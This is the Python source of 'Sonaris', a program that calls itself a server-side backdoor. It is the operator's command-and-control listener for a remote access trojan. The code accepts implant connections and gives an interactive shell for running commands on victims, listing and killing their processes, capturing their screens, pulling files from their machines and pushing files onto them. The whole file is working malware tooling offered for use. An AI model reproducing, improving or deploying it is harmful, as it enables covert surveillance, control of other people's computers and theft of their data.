#!/usr/bin/python3
# coding: utf-8

__authors__ = "{Nairy's} {Jave's}"
__version__ = 'linux - win10 - win7'
__contact__ = '{__Nairy__#7181} {Javaly#8240}'


import socket
from datetime import datetime
from pickle import loads, dumps
from time import sleep
from sys import argv, exit
from os import path, system
from platform import uname
from termcolor import colored

class Sonaris(object):
    ''' server side backdoor '''
    def __init__(self, host, port):
        self.__Adress = (host, port)
        self.__Server = None
        self._FullBufferSize = 65500
        self._CmdBufferSize = 16384
        self._HeaderBufferSize = 512
        self.commands = "/commands\n/info\n/clear\n/getinfocountry\n/getprocesslist\n/kill\n/screenshot\n/download\n/exit"

    def CreateSocket(self):
        try:
            self.__Server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.__Server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.__Server.bind(self.__Adress)
            self.__Server.listen(10)

        except Exception as e:
            print(colored(f'  [*] Error: Invalid adress {self.__Adress} {e}', 'red'))
            exit()

    def GetProcessList(self, connection, command):
        connection.send(command.encode())
        try:
            proclist = connection.recv(self._CmdBufferSize)
            proclist = loads(proclist)
            
            print(f" PID{' '*11}Process Name")
            
            for process in proclist:
                print(process)

            return colored(f'{len(proclist)} processes running...', 'red')
        except:
            return colored(proclist.decode('utf-8'))
    
    def KillProcess(self, connection, command):
        connection.send(command.encode())
        confirmation = connection.recv(self._HeaderBufferSize)
        return colored(f"{confirmation.decode('utf=8')}", "red")
    
    def UploadFiles(self, namefile, connection):
        try:
            with open(str(namefile.strip()), 'rb') as file:
                name, extension = path.splitext(namefile.strip())
                file = file.read()
                len_bytes = len(file)
                header = {
                    "name": name,
                    "extension": extension,
                    "numofbytes": len_bytes,
                    }

                connection.send('/upload'.encode())
                connection.recv(32)
                connection.send(dumps(header))
                sleep(0.6)
                connection.send(file)

            confirmation = connection.recv(256)
            return colored(confirmation.decode('utf-8'), 'cyan')

        except FileNotFoundError:
            return colored(f' [*] File corrupt or not found...', 'red')
        except PermissionError:
            return colored(f' [*] Action not permited...', 'red')
        except Exception as e:
            return colored(f' [*] Error: {e}...', 'red')

    def Screenshot(self, connection, command):
        try:
            connection.send(command.strip().encode())
            header = loads(connection.recv(self._HeaderBufferSize))
            self.SaveScreenshot(header, connection)
            return colored('Screenshot sucessfull...  ', 'cyan')
        except:
            return colored('Screenshot failed...  ', 'red')
            
    def SaveScreenshot(self, header, connection):
        screenshot = b''
        '''
        while True is not False:
            if(len(screenshot) >= header['numofbytes']):
                break
            else:
                screenshot += connection.recv(header['numofbytes'])

            print(colored(f'{int((len(screenshot)/header["numofbytes"])*100)}% {len(screenshot)} bytes received', 'yellow'), end='\r')
        '''

        while(len(screenshot) <= header['numofbytes']):
            screenshot += connection.recv(header['numofbytes'])
            print(colored(f'{int((len(screenshot)/header["numofbytes"])*100)}% {len(screenshot)} bytes received', 'yellow'), end='\r')
            
        current = datetime.now()
        with open(f'screenshot-{current.hour}-{current.minute}-{current.second}{header["extension"]}', 'wb') as file:
            file.write(screenshot)
            file.close()

    def SavingSmallFile(self, header, connection):
        with open(f'{header["name"]}{header["extension"]}', 'wb') as file:
            file_downloaded = connection.recv(self._FullBufferSize)
            file.write(file_downloaded)
            file.close()

    def SavingLargeFile(self, header, connection):
        file_downloaded = b''
        '''
        while True is not False:
            if(len(file_downloaded) >= header['numofbytes']):
                break
            else:
                file_downloaded += connection.recv(header['numofbytes'])

            print(colored(f'{int((len(file_downloaded)/header["numofbytes"])*100)}% {len(file_downloaded)} bytes received', 'yellow'), end='\r')
        '''
        while(len(file_downloaded) <= header['numofbytes']):
            file_downloaded += connection.recv(header['numofbytes'])
            print(colored(f'{int((len(file_downloaded)/header["numofbytes"])*100)}% {len(file_downloaded)} bytes received', 'yellow'), end='\r')
            
        with open(f'{header["name"]}{header["extension"]}', 'wb') as file:
            file.write(file_downloaded)
            file.close()

    def DownloadFiles(self, connection, command):
        connection.send(command.strip().encode())
        try:
            received_header = connection.recv(self._HeaderBufferSize)
            header = loads(received_header)

            if(header["numofbytes"] >= self._FullBufferSize):
                print(colored(f'Receiving the file {header["name"]}{header["extension"]}...', 'yellow'))
                self.SavingLargeFile(header, connection)
                return colored('Download sucessfull...    ', 'cyan')

            else:
                print(colored(f'Receiving the file {header["name"]}{header["extension"]}...', 'yellow'))
                self.SavingSmallFile(header, connection)
                return colored('Download Sucessfull...    ', 'cyan')
        except:
            return f'{received_header.decode("utf-8")}'

    def ClearScreen(self):
        if('Win' in uname()[0].strip()):
            system('cls')
        elif('Lin' in uname()[0].strip()):
            system('clear')
        
        return ' '

    def Listening(self):
        try:
            connection, adress = self.__Server.accept()
            connection.setblocking(1)
            msg = connection.recv(32)
            print(colored(f'    - Incoming connection: {adress[0]}:{adress[1]} -{msg.decode("utf-8", errors="replace")}', 'yellow'))
            self.Shell(connection)
        except KeyboardInterrupt:
            pass

    def ReceivingCommands(self, connection, command):
        try:
            connection.send(command.encode())
            header = loads(connection.recv(self._CmdBufferSize))
            received_command = b''
            '''
            while True is not False:
                if(len(received_command) >= header['size']):
                    break
                else:
                    received_command += connection.recv(header['size'])
            '''
            while(len(received_command) <= header['size']):
                received_command += connection.recv(header['size'])
                print(colored(f'{int((len(received_command)/header["numofbytes"])*100)}% {len(received_command)} bytes received', 'yellow'), end='\r')
            
            return f'{received_command.decode("utf-8", errors="replace")}'
        
        except Exception:
            return 1

    def SendCommands(self, connection, command):
        try:
            if(command.strip()[:9] == '/download'):
                if(command.strip() != '/download'):
                    return self.DownloadFiles(connection, command)
                else:
                    return colored(' [*] pass the filename', 'red')
            elif(command.strip() == '/clear'):
                return self.ClearScreen()
            elif(command.strip() == '/getprocesslist'):
                return self.GetProcessList(connection, command.strip())
            elif(command.strip()[:5] == '/kill'):
                return self.KillProcess(connection, command.strip())
            elif(command.strip() == '/screenshot'):
                return self.Screenshot(connection, command.strip())
            elif(command.strip() == '/commands'):
                return self.commands
            elif(command.strip()[:7] == '/upload'):
                return self.UploadFiles(command[8:], connection)
            else:
                return self.ReceivingCommands(connection, command)
        except:
            return 1

    def Shell(self, connection):
        print(colored('  [*] Runing shell...\n', 'yellow'))
        sleep(1)
        
        try:
            while True is not False:
                command = str(input(colored('{sonaris@bck}~# ', 'green')))
                if(command.strip() != ''):
                    if(command.strip() != '/exit'):
                        received_command = self.SendCommands(connection, command)
                        if(received_command != 1):
                            print(received_command)
                        else:
                            self.SendCommands(connection, command)
                            self.__Server.close()
                            print(colored('  Error: connection lost...', 'red'))
                            break
                    else:
                        self.SendCommands(connection, command)
                        self.__Server.close()
                        break

        except KeyboardInterrupt:
            print('\n')
            self.SendCommands(connection, '/exit')
            self.__Server.close()

    def Main(self):
        print(colored('  [*] Creating the Socket...', 'green'))
        self.CreateSocket()
        print(colored(f'  [*] Server Listening on {self.__Adress[0]}:{self.__Adress[1]}', 'green'))
        self.Listening()



def Screenfetch():
    return r'''
    _______  _____  __   _ _______  ______ _____ _______
    |______ |     | | \  | |_____| |_____/   |   |______
    ______| |_____| |  \_| |     | |    \_ __|__ ______|
    '''

def main():
    try:
        host, port = str(argv[1]), int(argv[2])
        backdoor = Sonaris(host, port)
        print(colored(Screenfetch(), 'red'))
        backdoor.Main()

    except IndexError:
        print(colored('  Error: pass parameters with IP address and Port.', 'red'))
    except KeyError:
        print(colored('  Error: Invalid adress', 'red'))


if(__name__ == '__main__'):
    main()